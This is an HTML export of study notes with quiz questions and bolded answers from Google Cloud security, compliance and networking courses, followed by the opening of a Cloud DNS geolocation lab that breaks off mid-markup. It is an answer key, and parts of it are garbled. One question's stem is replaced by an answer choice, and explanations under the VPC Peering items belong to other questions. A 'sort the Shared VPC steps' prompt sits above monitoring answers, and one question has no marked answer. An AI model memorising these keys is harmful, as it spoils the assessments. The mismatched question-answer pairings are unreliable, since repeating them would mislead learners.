</span></p></li></ol><ul><li><p><span>Rotation periods              </span></p></li><li><p><span>Retention policies              </span></p></li><li><p><strong><span>Lifecycle management rules</span></strong><span>              </span></p></li><li><p><span>Object versioning</span></p></li></ul><ol start='2' ><li><p><span>Which tool will Cymbal Bank use to scan for, detect, and optionally transform sensitive data to prevent exposure?</span></p></li></ol><ul><li><p><strong><span>Sensitive Data Protection</span></strong></p></li><li><p><span>Secret Manager</span></p></li><li><p><span>Google Cloud Armor</span></p></li><li><p><span>VPC service controls</span></p></li></ul><p>&nbsp;</p><h2 id='managing-operations'><span>Managing Operations</span></h2><h3 id='diagnostic-questions-4'><span>Diagnostic questions</span></h3><ol start='' ><li><p><span>The loan application from Cymbal Bank’s lending department collects credit reports that contain credit payment information from customers. According to bank policy, the PDF reports are stored for six months in Cloud Storage, and access logs for the reports are stored for three years. You need to configure a cost-effective storage solution for the access logs. What should you do?</span></p></li></ol><ul><li><p><span>Set up a logging export dataset in BigQuery to collect data from Cloud Logging and the Security Command Center. Create table expiry rules to delete logs after three years.</span></p></li><li><p><strong><span>Set up a logging export bucket in Cloud Storage to collect data from Cloud Audit Logs. Configure object lifecycle management rules to delete logs after three years.</span></strong></p></li><li><p><span>Set up a logging export dataset in BigQuery to collect data from Cloud Logging and Cloud Monitoring. Create table expiry rules to delete logs after three years.</span></p></li><li><p><span>Set up a logging export bucket in Cloud Storage to collect data from the Security Command Center. Configure object lifecycle management rules to delete logs after three years.</span></p></li></ul><ol start='2' ><li><p><span>Cymbal Bank uses Docker containers to interact with APIs for its personal banking application. These APIs are under PCI-DSS compliance. The Kubernetes environment running the containers will not have internet access to download required packages. How would you automate the pipeline that is building these containers?</span></p></li></ol><ul><li><p><span>Create a Dockerfile with container definition and cloudbuild.yaml file. Use Cloud Build to build the image from Dockerfile. Upload the built image to a Google Container registry and Dockerfile to a Git repository. In the cloudbuild.yaml template, include attributes to tag the Git repository path with a Google Kubernetes Engine cluster. Create a trigger in Cloud Build to automate the deployment using the Git repository.</span></p></li><li><p><strong><span>Create a Dockerfile with a container definition and a Cloud Build configuration file. Use the Cloud Build configuration file to build and deploy the image from Dockerfile to a Google Container registry. In the configuration file, include the Google Container Registry path and the Google Kubernetes Engine cluster. Upload the configuration file to a Git repository. Create a trigger in Cloud Build to automate the deployment using the Git repository.</span></strong></p></li><li><p><span>Build a foundation image. Store all artifacts and a Packer definition template in a Git repository. Use Container Registry to build the artifacts and Packer definition. Use Cloud Build to extract the built container and deploy it to a Google Kubernetes Engine (GKE) cluster. Add the required users and groups to the GKE project.</span></p></li><li><p><span>Build an immutable image. Store all artifacts and a Packer definition template in a Git repository. Use Container Registry to build the artifacts and Packer definition. Use Cloud Build to extract the built container and deploy it to a Google Kubernetes Engine Cluster (GKE). Add the required users and groups to the GKE project.</span></p></li></ul><ol start='3' ><li><p><span>Cymbal Bank runs a Node.js application on a Compute Engine instance. Cymbal Bank needs to share this base image with a ‘development’ Google Group. This base image should support secure boot for the Compute Engine instances deployed from this image. How would you automate the image creation?</span></p></li></ol><ul><li><p><strong><span>Prepare a shell script. Add the command gcloud compute instances stop with the Node.js instance name. Set up certificates for secure boot. Add gcloud compute images create, and specify the Compute Engine instance’s persistent disk and zone and the certificate files. Add gcloud compute images add-iam-policy-binding and specify the ‘development’ group.</span></strong></p></li><li><p><span>Prepare a shell script. Add the command gcloud compute instances start to the script to start the Node.js Compute Engine instance. Set up Measured Boot for secure boot. Add gcloud compute images create, and specify the persistent disk and zone of the Compute Engine instance.</span></p></li><li><p><span>Start the Compute Engine instance. Set up certificates for secure boot. Prepare a cloudbuild.yaml configuration file. Specify the persistent disk location of the Compute Engine and the ‘development’ group. Use the command gcloud builds submit --tag, and specify the configuration file path and the certificates.</span></p></li><li><p><span>Stop the Compute Engine instance. Set up Measured Boot for secure boot. Prepare a cloudbuild.yaml configuration file. Specify the persistent disk location of the Compute Engine instance and the ‘development’ group. Use the command gcloud builds submit --tag, and specify the configuration file path.</span></p></li></ul><ol start='4' ><li><p><span>Cymbal Bank has suffered a remote botnet attack on Compute Engine instances in an isolated project. The affected project now requires investigation by an external agency. An external agency requests that you provide all admin and system events to analyze in their local forensics tool. You want to use the most cost-effective solution to enable the external analysis. What should you do?</span></p></li></ol><ul><li><p><span>Use Cloud Monitoring and Cloud Logging. Filter Cloud Monitoring to view only system and admin logs. Expand the system and admin logs in Cloud Logging. Use Pub/Sub to export the findings from Cloud Logging to the external agency’s forensics tool or storage.</span></p></li><li><p><span>Use Event Threat Detection. Trigger the IAM Anomalous Grant detector to detect all admins and users with admin or system permissions. Export these logs to the Security Command Center. Give the external agency access to the Security Command Center.</span></p></li><li><p><strong><span>Use Cloud Audit Logs. Filter Admin Activity audit logs for only the affected project. Use a Pub/Sub topic to stream the logs from Cloud Audit Logs to the external agency’s forensics tool.</span></strong></p></li><li><p><span>Use the Security Command Center. Select Cloud Logging as the source, and filter by category: Admin Activity and category: System Activity. View the Source property of the Finding Details section. Use Pub/Sub topics to export the findings to the external agency’s forensics tool.</span></p></li></ul><ol start='5' ><li><p><span>Set an organization-level policy that  requires all Compute Engine VMs to be configured as Shielded VMs. Use  Measured Boot enabled with Virtual Trusted Platform Module (vTPM).  Validate integrity events in Cloud Monitoring and place alerts on late  boot validation events.</span></p></li></ol><ul><li><p><span>Set an organization-level policy that requires all Compute Engine VMs to be configured as Shielded VMs. Use Secure Boot enabled with Unified Extensible Firmware Interface (UEFI). Validate integrity events in Cloud Monitoring and place alerts on launch attestation events.</span></p></li><li><p><strong><span>Set an organization-level policy that requires all Compute Engine VMs to be configured as Shielded VMs. Use Measured Boot enabled with Virtual Trusted Platform Module (vTPM). Validate integrity events in Cloud Monitoring and place alerts on late boot validation events.</span></strong></p></li><li><p><span>Set Cloud Logging measurement policies on the VMs. Use Cloud Logging to place alerts whenever actualMeasurements and policyMeasurements don’t match.</span></p></li><li><p><span>Set project-level policies that require all Compute Engine VMs to be configured as Shielded VMs. Use Measured Boot enabled with Virtual Trusted Platform Module (vTPM). Validate integrity events in Cloud Monitoring and place alerts on late boot validation events.</span></p></li></ul><ol start='6' ><li><p><span>Cymbal Bank has Docker applications deployed in Google Kubernetes Engine. The bank has no offline containers. This GKE cluster is exposed to the public internet and has recently recovered from an attack. Cymbal Bank suspects that someone in the organization changed the firewall rules and has tasked you to analyze and find all details related to the firewall for the cluster. You want the most cost-effective solution for this task. What should you do?</span></p></li></ol><ul><li><p><strong><span>View the GKE logs in Cloud Logging. Use the log scoping tool to filter the Firewall Rules log. Create a dataset in BigQuery to accept the logs. Export the logs to BigQuery using the command gcloud logging sinks create. Query this dataset.</span></strong></p></li><li><p><span>View the GKE logs in the local GKE cluster. Use the kubectl Sysdig Capture tool to filter the Firewall Rules log. Create a Pub/Sub topic. Export these logs to a Pub/Sub topic using the GKE cluster. Use Dataflow to read from Pub/Sub and query the stream.</span></p></li><li><p><span>View the GKE logs in the local GKE cluster. Use Docker-explorer to explore the Docker file system. Filter and export the Firewall logs to Cloud Logging. Create a dataset in BigQuery to accept the logs. Use the command gcloud logging sinks create to export the logs to a BigQuery dataset. Query this dataset.</span></p></li><li><p><span>View the GKE logs in Cloud Logging. Use the log scoping tool to filter the Firewall Rules log. Create a Pub/Sub topic. Export the logs to a Pub/Sub topic using the command gcloud logging sinks create. Use Dataflow to read from Pub/Sub and query the stream.</span></p></li></ul><ol start='7' ><li><p><span>Cymbal Bank has received Docker source files from its third-party developers in an Artifact Registry repository. These Docker files will be part of a CI/CD pipeline to update Cymbal Bank’s personal loan offering. The bank wants to prevent the possibility of remote users arbitrarily using the Docker files to run any code. You have been tasked with using Container Analysis’ On-Demand scanning to scan the images for a one-time update. What should you do?</span></p></li></ol><ul><li><p><strong><span>Prepare a cloudbuild.yaml file. In this file, add four steps in order—build, scan, severity check, and push—specifying the location of Artifact Registry repository. Specify severity level as CRITICAL. Start the build with the command gcloud builds submit.</span></strong></p></li><li><p><span>Prepare a cloudbuild.yaml file. In this file, add four steps in order—scan, severity check, build, and—push specifying the location of the Artifact Registry repository. Specify severity level as HIGH. Start the build with the command gcloud builds submit.</span></p></li><li><p><span>Prepare a cloudbuild.yaml file. In this file, add four steps in order—scan, build, severity check, and push—specifying the location of the Artifact Registry repository. Specify severity level as HIGH. Start the build with the command gcloud builds submit.</span></p></li><li><p><span>Prepare a cloudbuild.yaml file. In this file, add four steps in order—build, severity check, scan, and push—specifying the location of the Artifact Registry repository. Specify severity level as CRITICAL. Start the build with the command gcloud builds submit.</span></p></li></ul><ol start='8' ><li><p><span>Cymbal Bank experienced a recent security issue. A rogue employee with admin permissions for Compute Engine assigned existing Compute Engine users some arbitrary permissions. You are tasked with finding all these arbitrary permissions. What should you do to find these permissions most efficiently?</span></p></li></ol><ul><li><p><span>Use Event Threat Detection and trigger the IAM Anomalous Grant detector. Publish results to Cloud Logging. In the Security Command Center, select Cloud Logging as the source, filter by category: anomalies, and sort to find the attack time window. Click on Persistence: IAM Anomalous Grant to display Finding Details. View the Source property of the Finding Details section.</span></p></li><li><p><span>Use Event Threat Detection and configure Continuous Exports to filter and write only Firewall logs to the Security Command Center. In the Security Command Center, select Event Threat Detection as the source, filter by category: anomalies, and sort to find the attack time window. Click on Evasion: IAM Anomalous Grant to display Finding Details. View the Source property of the Finding Details section.</span></p></li><li><p><strong><span>Use Event Threat Detection and trigger the IAM Anomalous grants detector. Publish results to the Security Command Center. In the Security Command Center, select Event Threat Detection as the source, filter by category: iam, and sort to find the attack time window. Click on Persistence: IAM Anomalous Grant to display Finding Details. View the Source property of the Finding Details section.</span></strong></p></li><li><p><span>Use Event Threat Detection and configure Continuous Exports to filter and write only Firewall logs to the Security Command Center. In the Security Command Center, select Event Threat Detection as the source, filter by evasion: Iam, and sort to find the attack time window. Click on Persistence: IAM Anomalous Grant to display Finding Details. View the Source property of the Finding Details section.</span></p></li></ul><ol start='9' ><li><p><span>Cymbal Bank wants to use Cloud Storage and BigQuery to store safe deposit usage data. Cymbal Bank needs a cost-effective approach to auditing only Cloud Storage and BigQuery data access activities. How would you use Cloud Audit Logs to enable this analysis?</span></p></li></ol><ul><li><p><span>Enable Data Access Logs for ADMIN_READ, DATA_READ, and DATA_WRITE at the service level for BigQuery and Cloud Storage.</span></p></li><li><p><span>Enable Data Access Logs for ADMIN_READ, DATA_READ, and DATA_WRITE at the organization level.</span></p></li><li><p><span>Enable Data Access Logs for ADMIN_READ, DATA_READ, and DATA_WRITE for BigQuery. All Data Access Logs are enabled for Cloud Storage by default.</span></p></li><li><p><strong><span>Enable Data Access Logs for ADMIN_READ, DATA_READ, and DATA_WRITE for Cloud Storage. All Data Access Logs are enabled for BigQuery by default.</span></strong></p></li></ul><ol start='10' ><li><p><span>Cymbal Bank uses Compute Engine instances for its APIs, and recently discovered bitcoin mining activities on some instances. The bank wants to detect all future mining attempts and notify the security team. The security team can view the Security Command Center and Cloud Audit Logs. How should you configure the detection and notification?</span></p></li></ol><ul><li><p><span>Enable the VM Manager tools suite in the Security Command Center. Perform a scan of Compute Engine instances. Publish results to Cloud Audit Logging. Create an alert in Cloud Monitoring to send notifications of suspect activities.</span></p></li><li><p><span>Enable the Web Security Scanner in the Security Command Center. Perform a scan of Compute Engine instances. Publish results to Cloud Audit Logging. Create an alert in Cloud Monitoring to send notifications for suspect activities.</span></p></li><li><p><span>Use Event Threat Detection’s threat detectors. Export findings from ‘Suspicious account activity’ and ‘Anomalous IAM behavior’ detectors and publish them to a Pub/Sub topic. Create a Cloud Run function to send notifications of suspect activities. Use Pub/Sub notifications to invoke the Cloud Run function.</span></p></li><li><p><strong><span>Enable Anomaly Detection in the Security Command Center. Create and configure a Pub/Sub topic and an email service. Create a Cloud Run function to send email notifications for suspect activities. Export findings to a Pub/Sub topic, and use them to invoke the Cloud Run function.</span></strong></p></li></ul><h3 id='knowledge-check-4'><span>Knowledge Check</span></h3><ol start='' ><li><p><span>Which feature of Google Cloud will Cymbal Bank use to prevent unauthorized container images from being deployed into production environments?</span></p></li></ol><ul><li><p><span>Cloud Build</span></p></li><li><p><strong><span>Binary Authorization</span></strong></p></li><li><p><span>Cloud Monitoring</span></p></li><li><p><span>Audit logs</span></p></li></ul><p><span>Correct. Binary Authorization provides a system for applying  attestations to container images to prevent unauthorized container  images from being deployed into infrastructure.</span></p><ol start='2' ><li><p><span>How will Cymbal Bank be able to determine who performed a particular administrative action and when?</span></p></li></ol><ul><li><p><span>Cloud Monitoring</span></p></li><li><p><strong><span>Audit logs</span></strong></p></li><li><p><span>VPC service controls</span></p></li><li><p><span>VPC flow logs</span></p></li></ul><p><span>Correct. Audit logs include a capture of all administrative actions,  including the identity making the request and when it occurred.</span></p><p>&nbsp;</p><h2 id='supporting-compliance-requirements'><span>Supporting Compliance Requirements</span></h2><h3 id='diagnostic-questions-5'><span>Diagnostic questions</span></h3><ol start='' ><li><p><span>Cymbal Bank’s Insurance Analyst needs to collect and store anonymous protected health information of patients from various hospitals. The information is currently stored in Cloud Storage, where each hospital has a folder that contains its own bucket. You have been tasked with collecting and storing the healthcare data from these buckets into Cymbal Bank’s Cloud Storage bucket while maintaining HIPAA compliance. What should you do?</span></p></li></ol><ul><li><p><strong><span>Use the Cloud Healthcare API to read the data from the hospital buckets and use de-identification to redact the sensitive information. Use Dataflow to ingest the Cloud Healthcare API feed and write data in a new Project that contains the Cloud Storage bucket. Give the Insurance Analyst the ‘Editor’ role on this Project.</span></strong></p></li><li><p><span>Create a new folder. Create a new Cloud Storage bucket in this folder. Give the Insurance Analyst the ‘Editor’ role on the new folder. Collect all hospital data in this bucket. Use the Google Cloud Healthcare Data Protection Toolkit to monitor this bucket.</span></p></li><li><p><span>Create a new Project. Use the Google Cloud Healthcare Data Protection Toolkit to set up a collection bucket, monitoring alerts, audit log sinks, and Forseti monitoring resources. Use Dataflow to read the data from source buckets and write to the new collection buckets. Give the Insurance Analyst the ‘Editor’ role on the collection bucket.</span></p></li><li><p><span>Create a new Project. Create a new Cloud Storage bucket in this Project with customer-supplied encryption keys (CSEK). Give the Insurance Analyst the ‘Reader’ role on the Project that contains the Cloud Storage bucket. Use the DLP API to find and mask personally identifiable information (PII) data to comply with HIPAA.</span></p></li></ul><ol start='2' ><li><p><span>You are a cloud engineer at Cymbal Bank. You need to share the auditing and compliance standards with your CTO that cover controls over financial reporting and both public and private controls over security, availability, and confidentiality. Which compliance standard covers this?</span></p></li></ol><ul><li><p><strong><span>SOX</span></strong></p></li><li><p><span>FIPs 140-2</span></p></li><li><p><span>GDPR</span></p></li><li><p><span>PCI-DSS</span></p></li></ul><ol start='3' ><li><p><span>Cymbal Bank plans to launch a new public website where customers can pay their equated monthly installments (EMI) using credit cards. You need to build a secure payment processing solution using Google Cloud which should follow the PCI-DSS isolation requirements. How would you architect a secure payment processing environment with Google Cloud services to follow PCI-DSS? (Select the two correct choices)</span></p></li></ol><ul><li><p><span>Deploy an Ubuntu Compute Engine instance. Install the libraries needed for payment solutions and encryption/decryption. Deploy using Terraform.</span></p></li><li><p><span>Create a new Google Cloud project with restricted access (separate from production environment) for the payment processing solution. Create a new Compute Engine instance and configure firewall rules, a VPN tunnel, and an internal load balancer.</span></p></li><li><p><span>Create a new Google Cloud project with restricted access (separate from production environment) for the payment processing solution. Configure firewall rules, a VPN tunnel, and a proxy Network Load Balancer for a new App Engine flexible environment.</span></p></li><li><p><strong><span>Deploy a Linux base image from preconfigured operating system images. Install only the libraries you need. Deploy using Terraform.</span></strong></p></li><li><p><strong><span>Create a new Google Cloud project with restricted access (separate from production environment) for the payment processing solution. Configure firewall rules, a VPN tunnel, and an Application Load Balancer for a new Compute Engine instance.</span></strong></p></li></ul><ol start='4' ><li><p><span>You are designing a web application for Cymbal Bank so that customers who have credit card issues can contact dedicated support agents. Customers may enter their complete credit card number when chatting with or emailing support agents. You want to ensure compliance with PCI-DSS and prevent support agents from viewing this information in the most cost-effective way. What should you do?</span></p></li></ol><ul><li><p><span>Implement Cloud Data Loss Prevention using its REST API.</span></p></li><li><p><span>Detect sensitive information with Cloud Natural Language API.</span></p></li><li><p><span>Use customer-managed encryption keys (CMEK) and Cloud Key Management Service (KMS) to detect and encrypt sensitive information.</span></p></li><li><p><span>Use customer-supplied encryption keys (CSEK) and Cloud Key Management Service (KMS) to detect and encrypt sensitive information.</span></p></li></ul><ol start='5' ><li><p><span>Cymbal Bank’s lending department stores sensitive information, such as your customers’ credit history, address and phone number, in parquet files. You need to upload this personally identifiable information (PII) to Cloud Storage so that it’s secure and compliant with ISO 27018. How should you protect this sensitive information using Cymbal Bank’s encryption keys and using the least amount of computational resources?</span></p></li></ol><ul><li><p><span>Generate a customer-managed encryption key (CMEK) using Cloud KMS. Decode it as a base-64 string. Upload the blob to the bucket using this key.</span></p></li><li><p><span>Generate an RSA key as a 32-byte bytestring. Decode it as a base-64 string. Upload the blob to the bucket using this key.</span></p></li><li><p><span>Generate a customer-managed encryption key (CMEK) using RSA or AES256 encryption. Decode it as a base-64 string. Upload the blob to the bucket using this key.</span></p></li><li><p><strong><span>Generate an AES-256 key as a 32-byte bytestring. Decode it as a base-64 string. Upload the blob to the bucket using this key.</span></strong></p></li></ul><h3 id='knowledge-check-5'><span>Knowledge Check</span></h3><ol start='' ><li><p><span>Cymbal Bank has a compliance requirement to have control over key lifecycle and rotation periods. Which Google Cloud feature can they leverage to satisfy that requirement?</span></p></li></ol><ul><li><p><strong><span>CMEK with Cloud KMS</span></strong></p></li><li><p><span>VPC service controls</span></p></li><li><p><span>Audit logs</span></p></li><li><p><span>PCI-DSS compliance</span></p></li></ul><p><span>Correct. CMEK with Cloud KMS provides the ability to set key rotation  and lifecycle configuration and select which keys are used for which  data.</span></p><ol start='2' ><li><p><span>Cymbal Bank has compliance requirements to ensure certain data is stored, processed, and never transferred or used outside of Europe. Which Google Cloud feature can help them achieve this?</span></p></li></ol><ul><li><p><span>Audit logs</span></p></li><li><p><strong><span>VPC service controls</span></strong></p></li><li><p><span>Organization policy constraints</span></p></li><li><p><span>Sensitive Data Protection</span></p></li></ul><p><span>Correct! VPC service controls can be used to restrict access to data to  specific VPCs with subnets in specific regions, and can thereby  facilitate data residency and location-based access requirements.</span></p><p>&nbsp;</p><h1 id='03-networking-in-google-cloud-fundamentals'><span>03 Networking in Google Cloud: Fundamentals</span></h1><p>&nbsp;</p><h2 id='vpc-networking-fundamentals'><span>VPC Networking Fundamentals</span></h2><h3 id='quiz'><span>Quiz</span></h3><ol start='' ><li><p><span>You want to lower cloud networking cost and have no problem leveraging the public internet for cross-region traffic. Which network service tier is best for you?</span></p></li></ol><ul><li><p><span>Pro version </span></p></li><li><p><span>Premium tier</span></p></li><li><p><strong><span>Standard tier</span></strong></p></li><li><p><span>Prime tier </span>
<span>Correct! Most cost-effective, suitable for cost-conscious users willing to use public internet routing.</span></p></li></ul><ol start='2' ><li><p><span>You want to improve network performance. You are not comfortable using the public internet to route traffic. Which service tier is the best fit?</span></p></li></ol><ul><li><p><span>Pro version </span></p></li><li><p><strong><span>Premium tier</span></strong></p></li><li><p><span>Standard tier</span></p></li><li><p><span>Prime tier</span>
<span>Correct! Premium Tier improves performance and leverages the Google network</span></p></li></ul><ol start='3' ><li><p><span>You are designing a virtual machine in the cloud to act as a network gateway between an external public network and a private internal network. To ensure strong security and traffic separation, what technology can you implement?</span></p></li></ol><ul><li><p><strong><span>Multiple Network Interface Cards (NICs)</span></strong></p></li><li><p><span>Cloud VPN</span></p></li><li><p><span>VLAN tagging within a single NIC</span></p></li><li><p><span>Premium Tier IPs</span>
<span>Correct! Multiple NICs attached to separate VPC networks achieve the strongest traffic isolation and control for the gateway scenario.</span></p></li></ul><h2 id='sharing-vpc-networks'><span>Sharing VPC Networks</span></h2><h3 id='quiz-2'><span>Quiz</span></h3><ol start='' ><li><p><span>Which of the following statements about VPC Network Peering is correct?</span></p></li></ol><ul><li><p><strong><span>Transitive peering is not supported.</span></strong></p></li><li><p><span>Peered VPC networks do not remain administratively separate.</span></p></li><li><p><span>Subnet IP ranges can overlap across peered VPC networks.</span></p></li><li><p><span>Both sides of a peering association are set up in one single step.</span></p></li></ul><p><span>This is correct. Shared VPC allows multiple projects to share a common  VPC network, with a centralized host project managing the network  resources.</span></p><ol start='2' ><li><p><span>How does VPC Peering exchange routing information between two peered VPCs?</span></p></li></ol><ul><li><p><span>It relies on the default route table to forward traffic between the VPCs.</span></p></li><li><p><strong><span>It automatically discovers and propagates routes through the Google Cloud Router.</span></strong></p></li><li><p><span>It uses Border Gateway Protocol (BGP) to dynamically exchange routes.</span></p></li><li><p><span>It requires manual configuration of static routes in each VPC&#39;s route table.</span></p></li></ul><p><span>Correct. VPC Peering automatically propagates custom dynamic routes  through the Google Cloud Router, allowing each VPC to learn the routes  of the other peered VPC.</span></p><ol start='3' ><li><p><span>Which of the following approaches to multi-project networking uses a centralized network administration model?</span></p></li></ol><ul><li><p><span>Cloud VPN</span></p></li><li><p><span>Cloud VPN and Shared VPC</span></p></li><li><p><span>VPC Network Peering</span></p></li><li><p><strong><span>Shared VPC</span></strong></p></li></ul><p><span>This statement is correct. VPC Network Peering establishes a direct  connection between two VPC networks, but it does not extend to other VPC networks they might be peered with.</span></p><p>&nbsp;</p><h2 id='network-monitoring-and-logging'><span>Network Monitoring and Logging</span></h2><h3 id='quiz-3'><span>Quiz</span></h3><ol start='' ><li><p><span>Sort the following steps for provisioning Shared VPC in Google Cloud:</span></p></li></ol><ul><li><p><strong><span>Uptime checks</span></strong></p></li><li><p><span>Dashboards</span></p></li><li><p><span>Ops Agent</span></p></li><li><p><strong><span>Alerting policies</span></strong></p></li></ul><p><span>Correct! Alerting policies can email you when your web server cannot be reached.</span></p><p><span>Correct! Uptime checks test the availability of your web server and allow you to specify alerting policies.</span></p><ol start='2' ><li><p><span>In regards to VPC Flow Logs, which of the following statements is correct?</span></p></li></ol><ul><li><p><strong><span>Logs can be used for network monitoring, forensics, real-time security analysis, and expense optimization.</span></strong></p></li><li><p><span>Logs cannot be analyzed in BigQuery or visualized in Looker Studio.</span></p></li><li><p><span>Log updates are provided every 5 minutes.</span></p></li><li><p><span>There is a delay and performance penalty in routing logged IP packets.</span></p></li></ul><p><span>Correct! VPC Flow Logs can be used for network monitoring, forensics, real-time security analysis, and expense optimization.</span></p><p>&nbsp;</p><h1 id='04-networking-in-google-cloud-routing-and-addressing'><span>04 Networking in Google Cloud: Routing and Addressing </span></h1><h2 id='network-routing-and-addressing-in-google-cloud'><span>Network Routing and Addressing in Google Cloud</span></h2><h3 id='lab---cloud-dns---traffic-steering-using-geolocation-policy'><span>Lab - Cloud DNS - Traffic Steering using Geolocation Policy</span></h3><h4 id='overview'><span>Overview</span></h4><p><span>Cloud DNS routing policies enable users to configure DNS based traffic steering. A user can either create a Weighted Round Robin (WRR) routing policy or a Geolocation (GEO) routing policy. You can configure routing policies by creating special ResourceRecordSets with special routing policy values.</span></p><p><span>Use WRR to specify different weights per ResourceRecordSet for the resolution of domain names. Cloud DNS routing policies help ensure that traffic is distributed across multiple IP addresses by resolving DNS requests according to the configured weights.</span></p><p><span>In this lab, you will configure and test the Geolocation routing policy. Use GEO to specify source geolocations and to provide DNS answers corresponding to those geographies. The geolocation routing policy applies the nearest match for the source location when the traffic source location doesn&#39;t match any policy items exactly.</span></p><h4 id='what-you-learn'><span>What you learn</span></h4><p><span>You will learn how to:</span></p><ol start='' ><li><p><span>Launch client VMs, one in each region</span></p></li><li><p><span>Launch server VMs, one in each region except asia-south1</span></p></li><li><p><span>Create a private zone, for </span><code>example.com</code></p></li><li><p><span>Create a Geolocation routing policy using gcloud commands</span></p></li><li><p><span>Test the configuration</span></p></li></ol><h4 id='architecture'><span>Architecture</span></h4><p><span>Use the default VPC network to create all the virtual machines (VM) and launch client VMs in 3 Google Cloud locations: one in the United States, another in Europe, and another in Asia. To demonstrate the Geolocation routing policy behavior, you will create the server VMs only in two of those location - in the United States and in Europe. The archirtecture will look similar to what is shown in the graphic. (Note that the actual regions and zones within the United States and Europe may differ from those shown in the graphic.)</span></p><p><img src="images/8%2FlpClCM%2F6jdXaT35cMC8lQWcc0iS3OGAF5HIJVybTs%3D.png" referrerpolicy="no-referrer" alt="The default VPC diagram"></p><p><span>You will use Cloud DNS routing policies and create </span><code>ResourceRecordSets</code><span> for geo.example.com and configure the Geolocation policy to help ensure that a client request is routed to a server in the client&#39;s closest region.</span></p><p><img src="images/QnzO9JhP8FDiTfp5TELBXyKXmav7zf0Hyhds0gqrTgw%3D.png" referrerpolicy="no-referrer" alt="The Cloud DNS routing policies diagram"></p><h4 id='setup-and-requirements'><span>Setup and requirements</span></h4><h4 id='before-you-click-the-start-lab-button'><span>Before you click the Start Lab button</span></h4><p><strong><span>Note: Read these instructions.</span></strong></p><p>&nbsp;</p><p><span>Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources will be made available to you.</span></p><p><span>This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.</span></p><h4 id='what-you-need'><span>What you need</span></h4><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li><li><p><span>Time to complete the lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> If you already have your own personal Google Cloud account or project, do not use it for this lab.</span></p><p><strong><span>Note:</span></strong><span> If you are using a Pixelbook, open an Incognito window to run this lab.</span></p><h4 id='how-to-start-your-lab-and-sign-in-to-the-console'><span>How to start your lab and sign in to the Console</span></h4><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.</span></p><p><img src="images/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D.png" referrerpolicy="no-referrer" alt="Credentials panel"></p></li><li><p><span>Copy the username, and then click </span><strong><span>Open Google Console</span></strong><span>. The lab spins up resources, and then opens another tab that shows the </span><strong><span>Choose an account</span></strong><span> page.</span></p><p><strong><span>Note:</span></strong><span> Open the tabs in separate windows, side-by-side.</span></p></li><li><p><span>On the Choose an account page, click </span><strong><span>Use Another Account</span></strong><span>. The Sign in page opens.</span></p><p><img src="images/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D.png" referrerpolicy="no-referrer" alt="Choose an account dialog box with Use Another Account option highlighted "></p></li><li><p><span>Paste the username that you copied from the Connection Details panel. Then copy and paste the password.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You must use the credentials from the Connection Details panel. Do not use your Google Cloud Skills Boost credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).</span></p><ol start='' ><li><p><span>Click through the subsequent pages:</span></p></li></ol><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul><p><span>After a few moments, the Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> You can view the menu with a list of Google Cloud Products and Services by clicking the </span><strong><span>Navigation menu</span></strong><span> at the top-left.</span><img src="images/9vT7xPlxoNP%2FPsK0J8j0ZPFB4HnnpaIJVCDByaBrSHg%3D.png" referrerpolicy="no-referrer" alt="Cloud Console Menu"></p><h4 id='activate-google-cloud-shell'><span>Activate Google Cloud Shell</span></h4><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="images/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D.png" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="images/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D.png" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 